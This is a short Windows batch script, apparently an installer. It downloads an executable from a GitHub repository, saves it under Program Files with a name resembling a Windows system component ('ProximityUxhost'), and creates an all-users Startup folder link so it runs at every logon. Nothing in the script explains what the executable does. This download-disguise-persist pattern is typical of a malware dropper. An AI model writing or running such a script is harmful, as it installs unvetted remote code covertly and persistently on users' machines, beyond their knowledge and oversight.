

:: Run this to get script
:: curl -o setup.bat https://raw.githubusercontent.com/MacdaraTwomey/joey-zaza/main/setup.bat

mkdir "c:\Program Files\ProximityUxhost"
curl -o "c:\Program Files\ProximityUxhost\ProximityUxhost.exe" https://raw.githubusercontent.com/MacdaraTwomey/joey-zaza/main/build/ProximityUxhostl.exe

::mklink "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ProximityUxhost.lnk" "c:\Program Files\ProximityUxhost\ProximityUxhost.exe"
mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ProximityUxhost.lnk" "c:\Program Files\ProximityUxhost\ProximityUxhost.exe"